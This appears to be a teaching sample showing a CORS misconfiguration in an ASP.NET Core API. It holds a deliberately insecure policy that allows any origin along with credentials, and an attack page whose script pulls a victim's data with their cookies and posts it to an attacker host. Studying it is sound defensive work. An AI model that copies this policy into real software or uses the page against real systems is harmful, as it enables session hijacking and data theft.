## Vulnerable sample for CORS policy

#### Vulnerability Explanation:
1. Run the insecure API (localhost:5000).
2. Log in as a user in the browser to generate a session cookie.
3. Open http://attacker.com/malicious.cshtml.
4. Click "Steal Data" to send an unauthorized request to http://localhost:5000/api/user/userdata.
5. The API accepts the request due to the misconfigured CORS policy, and the attacker:
    - Sees the stolen user data in the console.
    - Sends the session cookie to http://attacker.com/steal.

####  Program.cs (Insecure API)
```csharp
var builder = WebApplication.CreateBuilder(args);

builder.Services.AddCors(options =>
{
    options.AddPolicy("InsecurePolicy", policy =>
    {
        policy.AllowAnyOrigin() // ❌ Allows any website (Security Risk)
              .AllowAnyMethod() // ❌ No method restrictions
              .AllowAnyHeader() // ❌ No header restrictions
              .AllowCredentials(); // ❌ Allows credentials (Session Hijacking Risk)
    });
});

builder.Services.AddControllers();
builder.Services.AddAuthentication("Cookies")
    .AddCookie("Cookies", options =>
    {
        options.LoginPath = "/Account/Login"; // Example authentication
    });

builder.Services.AddAuthorization();

var app = builder.Build();

app.UseCors("InsecurePolicy"); // Apply the insecure policy
app.UseAuthentication();
app.UseAuthorization();
app.MapControllers();
app.Run();
```
#### Attack Page (malicious.cshtml)
The following malicious webpage simulates a cross-origin request from an attacker’s domain (http://attacker.com).
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Page</title>
    <script>
        function stealData() {
            fetch("http://localhost:5000/api/user/userdata", {
                method: "GET",
                credentials: "include" // 🔴 Sends the user's session cookies
            })
            .then(response => response.json())
            .then(data => {
                console.log("Stolen Data:", data); // Logs stolen data to console
                document.getElementById("output").innerText = JSON.stringify(data);
                
                // 🔴 Send stolen data to attacker's server
                fetch("http://attacker.com/steal", {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: { "Content-Type": "application/json" }
                });
            })
            .catch(error => console.error("Error:", error));
        }
    </script>
</head>
<body>
    <h2>Click the button to steal user data</h2>
    <button onclick="stealData()">Steal Data</button>
    <p id="output"></p>
</body>
</html>
```